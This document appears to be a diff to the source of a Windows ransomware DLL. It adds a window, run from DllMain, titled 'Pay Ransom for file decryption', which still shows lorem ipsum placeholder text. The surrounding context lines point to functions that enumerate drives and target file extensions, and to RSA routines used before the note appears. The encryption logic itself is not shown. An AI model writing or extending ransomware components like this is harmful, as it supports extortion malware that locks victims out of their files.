@@ -22,8 +22,35 @@
 using namespace std;
 using namespace boost::filesystem;
 
+const int   screenSize_X = 640;
+const int   screenSize_Y = 480;
+
+
 vector<wstring>* get_available_drives();
 set<wstring>* get_wanted_extentions();
+
+//
+//
+// WndProc - Window procedure
+//
+//
+LRESULT
+CALLBACK
+WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+	switch (uMsg)
+	{
+	case WM_DESTROY:
+		::PostQuitMessage(0);
+		break;
+	default:
+		return ::DefWindowProc(hWnd, uMsg, wParam, lParam);
+	}
+
+	return 0;
+}
+
+
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -125,7 +152,82 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 		BIO_free_all(out);
 		rsa.free_all();
 
+		// Show ransom
+		// Setup window class attributes.
+		WNDCLASSEX wcex;
+		ZeroMemory(&wcex, sizeof(wcex));
 
+		wcex.cbSize = sizeof(wcex);	// WNDCLASSEX size in bytes
+		wcex.style = CS_HREDRAW | CS_VREDRAW;		// Window class styles
+		wcex.lpszClassName = TEXT("MYFIRSTWINDOWCLASS");	// Window class name
+		wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);	// Window background brush color.
+		wcex.hCursor = LoadCursor(hModule, IDC_ARROW); // Window cursor
+		wcex.lpfnWndProc = WndProc;		// Window procedure associated to this window class.
+		wcex.hInstance = hModule;	// The application instance.
+
+									// Register window and ensure registration success.
+		if (!RegisterClassEx(&wcex))
+			return 1;
+
+		// Setup window initialization attributes.
+		CREATESTRUCT cs;
+		ZeroMemory(&cs, sizeof(cs));
+
+		cs.x = 0;	// Window X position
+		cs.y = 0;	// Window Y position
+		cs.cx = 640;	// Window width
+		cs.cy = 480;	// Window height
+		cs.hInstance = hModule; // Window instance.
+		cs.lpszClass = wcex.lpszClassName;		// Window class name
+		cs.lpszName = TEXT("Pay Ransom for file decryption");	// Window title
+		cs.style = WS_OVERLAPPEDWINDOW;		// Window style
+
+											// Create the window.
+		HWND hWnd = ::CreateWindowEx(
+			cs.dwExStyle,
+			cs.lpszClass,
+			cs.lpszName,
+			cs.style,
+			cs.x,
+			cs.y,
+			cs.cx,
+			cs.cy,
+			cs.hwndParent,
+			cs.hMenu,
+			cs.hInstance,
+			cs.lpCreateParams);
+
+		// Validate window.
+		if (!hWnd)
+			return 1;
+
+		
+
+		// Display the window.
+		::ShowWindow(hWnd, SW_SHOWDEFAULT);
+		::UpdateWindow(hWnd);
+
+		HDC hdc = GetDC(hWnd);
+		RECT rect;
+		GetClientRect(hWnd, &rect);
+		LPCWSTR text = L"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.";
+		
+		DrawText(hdc, text, wcslen(text), &rect, DT_CENTER | DT_VCENTER);
+		ReleaseDC(hWnd, hdc);
+		/*RECT rect;
+		GetClientRect(hWnd, &rect);
+		::RedrawWindow(hWnd, &rect, NULL, RDW_INTERNALPAINT);*/
+
+		// Main message loop.
+		MSG msg;
+		while (::GetMessage(&msg, hWnd, 0, 0) > 0)
+			::DispatchMessage(&msg);
+
+		// Unregister window class, freeing the memory that was
+		// previously allocated for this window.
+		::UnregisterClass(wcex.lpszClassName, hModule);
+
+		return (int)msg.wParam;
 	}
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
